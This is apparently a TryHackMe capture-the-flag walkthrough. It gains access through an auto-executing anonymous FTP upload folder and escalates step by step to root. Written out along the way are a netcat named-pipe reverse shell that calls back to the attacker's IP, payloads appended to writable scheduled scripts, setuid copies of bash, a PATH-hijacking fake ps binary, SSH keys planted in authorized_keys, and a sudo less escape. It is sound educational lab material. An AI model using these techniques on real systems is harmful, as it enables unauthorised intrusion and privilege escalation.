Recon:
I run my favorite Nmap command:
<img width="1010" height="988" alt="image" src="https://github.com/user-attachments/assets/1cf176ca-a5bf-479e-8843-eccb66e06270" />  
Explanation of my nmap options:
-n doesn't resolve names, this speeds the scan up in this CTF environment where I know the IP and don't need to resolve the name
-Pn assumes the host is online and skips host discovery, again something I only do in a CTF environment where I know the host should be online
-A This does several big scans all in one, OS detection, version detection, script scanning, and traceroute
-p- This option scans every port, from a tradescraft standpoint this isn't a great option as this would flag every IDS and SOC around because it's very noisy when you send thousands of packets all targeting every port possible. But since this is a CTF room, I like to use it to quickly make sure I don't miss a lesser known exploit.

This box only has FTP and SSH open, and FTP is the low hanging fruit based on nmap telling us that the internal folder "incoming" is writeable and anonymous FTP login is allowed.
So lets go ahead and login to the FTP:
<img width="434" height="209" alt="image" src="https://github.com/user-attachments/assets/aeb53d98-a7ca-4d84-90b8-8d9dba6aa543" />  
Anonymous login is almost always username: Anonymous and password is any email address, I just use something fake like anon@anon.com
Now let's look through the files on the ftp server:
<img width="802" height="460" alt="image" src="https://github.com/user-attachments/assets/03fe7a08-2fc2-4ace-a591-179b7bccd979" />  
I first check the pub folder and immediately find a README.txt. I grabbed it with a get command, now lets read it on our local machine:
<img width="459" height="151" alt="image" src="https://github.com/user-attachments/assets/d5b494ae-3944-496a-91a5-be75d9846952" />  
Jackpot! This is telling us that "recon jobs" placed in the /incoming/ folder will be "automatically processed on arrival".  
So lets try a simple canary script to test and see if it gets automatically executed:
<img width="470" height="255" alt="image" src="https://github.com/user-attachments/assets/6e6e9fbd-e092-41db-9e56-5e855ba202b3" />  
Just to make this writeup as educational as possible, lets break this script down:
cat > shell.sh <<'EOF' //cat normally displays something, but with the > it is instead taking it and putting it into shell.sh, the <<'EOF' is telling cat to keep inputing until it gets EOF
#!/bin/sh //This is telling the Operating System running the script to use the shell located at /bin/sh to run the script.

OUT="/srv/ftp/incoming/ftp_processor_id.txt" //This is defining the variable OUT as the string containing the absolute path to the txt file we want to see to prove that our script is working.

id > "$OUT" //id is the command showing the uid, gid and groups of the current user running the script and $OUT is replaced by the string above thus creating the file
whoami >> "$OUT" //whoami is the command showing the current user running the script and >> appends or adds it to the end of the file
hostname >> "$OUT" //hostname is the command displaying the current host or computer's name
date >> "$OUT" //date displays the date and time
chmod 644 "$OUT" 2>/dev/null //chmod changes the permissions of the file to owner having read/write, and everyone else gets read rights.
EOF //Tells cat to stop taking input and finish creating shell.sh
<img width="794" height="440" alt="image" src="https://github.com/user-attachments/assets/bcb6dd47-744b-4990-9621-20a71a452dc3" />
We see that after puting shell.sh on the ftp server it seems to have run and created ftp_processor_id.txt lets go ahead and grab it and see what it says:
<img width="805" height="150" alt="image" src="https://github.com/user-attachments/assets/4e3de3cb-f4c4-4053-aa7e-2380abc61fbd" />
We can see recon_user with uid/gid 1001 and belonging to groups recon_user, dev_user, and devops made the file and the name of the host is tryhackme-2404 and the date and time matches.
With this we can now go ahead and put a reverse shell on the ftp server and gain our first foothold on the server.
<img width="615" height="147" alt="image" src="https://github.com/user-attachments/assets/14d01755-e61d-49fa-801d-8d64f972fe00" />
Let's break this down, the first two lines are the same as the previous script so I'll skip over that.
rm -f /tmp/f removes the file located at /tmp/f forcefully (-f) whether it exists or not
mkfifo /tmp/f creates a new piped file at /tmp/f which is essentially a file that passes information along from one process to another
cat /tmp/f | /bin/sh -i 2>&1 | nc 10.66.94.244 4444 > /tmp/f
This is the payload, cat /tmp/f reads the contents of the piped file and pipes it with | into an interactive (-i) shell /bin/sh. 2>&1 takes the error output (2) and outputs it to the standard output (1) so we can see error messages as we use the shell. This output from the shell is piped | into our netcat command connected to our IP address, and any commands that come from our netcat gets sent to the /tmp/f thus creating a cycle of commands into a shell into our shell through netcat.
In order for this shell to connect to us we have to setup a netcat listener:
<img width="377" height="50" alt="image" src="https://github.com/user-attachments/assets/1f33958b-271d-448f-9f8e-556b1eae8ac6" />
This simple command opens a netcat listener on port 4444
Specifically -l means listener, -n means numeric IP address only, -v means verbose output showing us every message from netcat, -p means port telling netcat that we are giving it a port (4444) to listen on.
Now we upload the payload and wait for recon_user's automatic script running to connect to us:
<img width="798" height="255" alt="image" src="https://github.com/user-attachments/assets/d2b9dc5c-a31b-4198-8cc4-4c33e29c8005" />  
Success! We have a very fragile shell on the box under user recon_user. Let's stabilize our shell:
<img width="499" height="109" alt="image" src="https://github.com/user-attachments/assets/55a27988-4893-401f-b546-24dba3da4389" />  
This is running a python command on the target box:
python3 -c tells it to run python code directly from the command line
import pty imports python's pty or pseudo-terminal module which makes the shell behave more like a real terminal instead of just a command pipe
pty("/bin/bash") spawns a bash shell (born again shell) inside that pseudo-terminal, so instead of a bare reverse shell it's more of a bash interactive shell.
export TERM=xterm sets an environment variable for the current shell and child and treat the terminal like an xterm-compatible terminal
stty rows 40 cols 120 sets the terminal size inside the target shell to 40 rows and 120 columns which is important for commands that need to know your screen size to work like vim or nano
<img width="442" height="130" alt="image" src="https://github.com/user-attachments/assets/5beea941-3625-47a7-a30b-439b683c5ea5" />  
Finally after running that script we type ctrl-z to stop and background our nc and go back to our local shell
stty raw -echo changes our local terminal to raw mode allowing keystrokes to go directly to the remote shell allowing commands like Ctrl-C, arrow keys, tab, etc.
-echo just stops the local terminal from echoing every keystroke and command
; fg is just another seperate command that brings the nc process that we stopped in the background back to the "foreground"
Now we have a nice bash shell instead of a simple shell.
Let's go ahead and read the flag by using the command:
cat /home/recon_user/flag.txt  
This will display the answer to the first question!
Next lets get an SSH shell for recon_user as we can't use SUDO commands through this Bash shell:
<img width="806" height="209" alt="image" src="https://github.com/user-attachments/assets/2c324219-089e-4031-a3a8-5e1df38542f2" />
Breaking this down:
rm -f /tmp/reconkey /tmp/reconkey.pub deletes old key files by force
ssh-keygen creates SSH keys
-t ed25519 is a modern SSH key algorithm
-f /tmp/reconkey sets the output filename
This creates two files /tmp/reconkey the private key and /tmp/reconkey.pub the public key
-N '' sets an empty passphrase so you can use the key without prompting for a passphrase and -q runs in quiet mode so there is less output on the screen.
mkdir -p /home/recon_user/.ssh creates the SSH configuration directory for recon_user
cat /tmp/reconkey.pub >> /home/recon_user/.ssh/authorized_keys appends and adds the public key to the authorized keys file allowing anyone with the corresponding private key to log in as this user.
chmod 700 /home/recon_user/.ssh sets directory permissions to owner can read/write/enter, group and no one else has access. SSH needs this because it will not open folders with too loose of permisions for security reasons.
chmod 600 /home/recon_user/.ssh/authorized_keys sets the file permissions to owner can read and write and group and others have no access, this again is because OpenSSH will reject keys with too loose of permisions.
<img width="772" height="461" alt="image" src="https://github.com/user-attachments/assets/c455095b-685d-4c18-8ff8-88fe811e7be1" />
This starts SSH and -i tells it to use the private key at /tmp/reconkey for authentication.
-o StrictHostKeyChecking=no tells SSH Do not stop and ask me to confirm the host key which is usually a message saying "Are you sure you want to continue connecting? (yes/no/[fingerprint])"
-o UserKnownHostsFile=/dev/null Normally SSH saves known host keys in ~/.ssh/known_hosts but this instead tells it to discard it to /dev/null so SSH will not permanently save the target's host key, this keeps the session cleaner and avoids various warnings.
Finally recon_user@127.0.0.1 is telling SSH to login as recon_user to the localhost loopback address which is by default 127.0.0.1
Now lets find out how to escalate to the next user:
<img width="470" height="82" alt="image" src="https://github.com/user-attachments/assets/d31279ba-945a-4f3f-b714-a374e0c5c735" />
Now let's check processes and services:
ps aux looks for running processes a searches all users, u outputs in a user-oriented format and x includes processes not attached to a terminal
ss -tulpn 2>/dev/null gives socket statistics, t shows TCP, u shows UDP, l shows only listening sockets, p shows the process using the socket and n shows numeric addresses and ports and finally we discard all error messages.
systemctl list-timers 2>/dev/null lists active timers in systemd which is services that run on a schedule and again we discard all error messages.
systemctl list-units --type=service 2>/dev/null shows us active systemd services and once again we discard all error messages
<img width="1211" height="454" alt="image" src="https://github.com/user-attachments/assets/53c18781-b6b9-4aa2-93e2-9a721d730dba" />
<img width="1208" height="160" alt="image" src="https://github.com/user-attachments/assets/97aba54b-9889-4be0-b13d-18076edcf02e" />
This healthcheck is an interesting find. It's running from /bin/bash which can allow us to gain a shell and it's on a timer to run. Let's inspect it closer:
<img width="416" height="190" alt="image" src="https://github.com/user-attachments/assets/c8f2cf25-8713-4f3f-8d45-43a8d66ffad7" />
This script is just running the ps command every 5 seconds
<img width="537" height="210" alt="image" src="https://github.com/user-attachments/assets/9a537983-40ec-42e9-b073-9a3aef0202be" />
This systemd service that is running the script has an unusual Environment PATH where it's using /opt/dev/bin before the /usr/local/bin and /usr/bin. This means it's using the binaries in /opt/dev/bin before the standard ones, and this may allow us to modify and implant a malicious ps binary in /opt/dev/bin
<img width="735" height="82" alt="image" src="https://github.com/user-attachments/assets/26d0c3bf-b924-4eb4-8390-bfcbde7cc22a" />
Deadend for now, we don't have permission to make ps executable at the moment, lets inspect dev_user a little closer and we may come back to this to escalate to monitor_user.
<img width="962" height="233" alt="image" src="https://github.com/user-attachments/assets/2aaf4c8a-7f80-474e-bf3e-7c0d9b65dd86" />
Here I run two commands:
ls -ld /opt /opt/dev /opt/dev/bin shows me who the owner of the actual folder is, root owns /opt but dev_user owns /opt/dev and /opt/dev/bin including the group which we have access to.
find /opt/dev -maxdepth 3 -ls 2>/dev/null searches everything inside /opt/dev to a depth of 3 and we find an interesting shell script called backup.sh which is already executable so we don't have to worry about not being able to change it's permissions.
<img width="519" height="87" alt="image" src="https://github.com/user-attachments/assets/7d047c8d-e852-4b3c-8311-b5bcc0959ff0" />
It looks like it's just TARing the recon_user folder into a backup file. Let's modify it and see if it triggers.
<img width="857" height="20" alt="image" src="https://github.com/user-attachments/assets/2559a024-e0a4-43e1-abbe-c42200a207fe" />
echo just takes the input and outputs it, however we are appending it to the file /opt/dev/backup.sh
id > /tmp/dev_backup_id.txt is just creating a file in /tmp/ which should hopefully show us the id of dev_user who we want to escalate to using this script
<img width="728" height="63" alt="image" src="https://github.com/user-attachments/assets/5f802272-9e45-4ddc-98be-22ad89b0e94f" />
Success, the canary worked and we see that dev_user executed the script. Now lets use this script to create a bash shell with dev_user's priveleges.
<img width="1523" height="503" alt="image" src="https://github.com/user-attachments/assets/361c6666-7f5f-41fa-b039-c4e44286a961" />
Now we add the payload to the script:
echo 'cp /bin/bash /tmp/devbash; chmod 4755 /tmp/devbash' These two commands copy the /bin/bash file to /tmp/devbash and changes the permissions to 4755 essentially making it executable. This is ammended to the end of the script >> /opt/dev/backup.sh
I run ls -lisa /tmp to see if devbash is created, and success it is!
Let's run it and see if we gain dev_user priveleges.
<img width="1138" height="132" alt="image" src="https://github.com/user-attachments/assets/03e5cf94-f60d-49f6-9c04-9c6b2c902947" />
Success! We are dev_ops and completed our first escalation. Grab that flag at /home/dev_user/flag.txt
Now we can change the permissions of the ps file we found earlier that is being run by healthcheck.services and see if we can escalate to monitor_user
<img width="425" height="213" alt="image" src="https://github.com/user-attachments/assets/40365251-b98b-441f-8779-b017bb7a7c96" />
This script should look familiar, we are creating a new /opt/dev/bin/ps file that runs on /bin/bash
This is combining the canary and payload into one file. We will look for the /tmp/healthcheck_ps_id.txt file and make sure the id returns as monitor_user before we go ahead and run /tmp/monitorbash
<img width="1182" height="172" alt="image" src="https://github.com/user-attachments/assets/eac4a00a-444b-462d-8439-63b94627c948" />  
After checking the canary txt file we see that it indeed is being run by the monitor_user and we go ahead and run the monitorbash
We double check that we escalated, and success we are monitor_user! Go grab that flag at /home/monitor_user/flag.txt
Now I like to again check if sudo works as this is a very common way to escalate priveleges.
<img width="334" height="72" alt="image" src="https://github.com/user-attachments/assets/b40438ad-0402-4433-9a85-749ba58aa17f" />
Still doesn't work, but maybe if we login through SSH we could bypass the password requirement. So lets do the same thing we did earlier to SSH in as recon_user
<img width="815" height="554" alt="image" src="https://github.com/user-attachments/assets/5ba830e9-6028-4761-966b-1367db87bb31" />  
Successfully created the keys like we did earlier.
<img width="1213" height="910" alt="image" src="https://github.com/user-attachments/assets/ad4ea18a-6e7f-489c-a6ba-a3e7175f06c6" />  
Using the same commands from before we successfully SSH into the system as monitor_user. Now let's retry the sudo command
<img width="1183" height="170" alt="image" src="https://github.com/user-attachments/assets/726e3fb6-a927-4d69-bd91-05095ff6fa64" />
There we go! An easy win, we can run /usr/local/bin/deploy.sh as ops_user, lets see if we can modify it and run it.
<img width="883" height="75" alt="image" src="https://github.com/user-attachments/assets/5ebe0843-4268-4e78-815f-1c24bf6e67bf" />
Oh dang, we can't modify deploy.sh, however after looking at the script it's just running ./deploy_helper.sh so maybe we can just modify that shell script
<img width="885" height="381" alt="image" src="https://github.com/user-attachments/assets/af05b9ae-cba0-419a-b09a-b9ff30483570" />  
Success! I echoed a bit of code into the shell script which does the same attack as before, causing the vulnerable user to copy /bin/bash to the /tmp/ folder and changing it's permissions.
I forgot to delete a previous mistake that created that file which is why I had to remove the previous file and rerun the script.
As we can see we are now the ops_user, now only one user left to escalate to, root. Go grab that flag at /home/ops_user/flag.txt
<img width="1189" height="216" alt="image" src="https://github.com/user-attachments/assets/0f53a1c5-a11d-4430-b77d-eddf57dfffa6" />
Not so fast, looks like we haven't fully gotten into ops_user. Let's see if we can SSH into ourselves like we did before:
<img width="1219" height="1013" alt="image" src="https://github.com/user-attachments/assets/0f39aade-ee1e-498b-8f45-65d68ae7e325" />
We run the same SSH scripts from before to create our keys and login, and success! Let's make sure we have the right priveleges:
<img width="1198" height="273" alt="image" src="https://github.com/user-attachments/assets/3091b99e-e9f5-4cfe-ba5f-940d1e697538" />
Looks good! We have sudo priveleges as root to use the 'less' command which is one of the easiest privelege escalations as you can run code directly in the less binary.
<img width="446" height="216" alt="image" src="https://github.com/user-attachments/assets/6eb876b2-5afc-46ff-b0ee-808c1ef680ff" />
Here I create a blank file using the touch command at /tmp/rootbash
Then I use sudo -n /usr/bin/less to open /tmp/rootbash
Then without doing anything else I type !/bin/bash and this causes the less process to run a bash using root priveleges
Success! We have root, go grab that flag at /root/flag.txt






















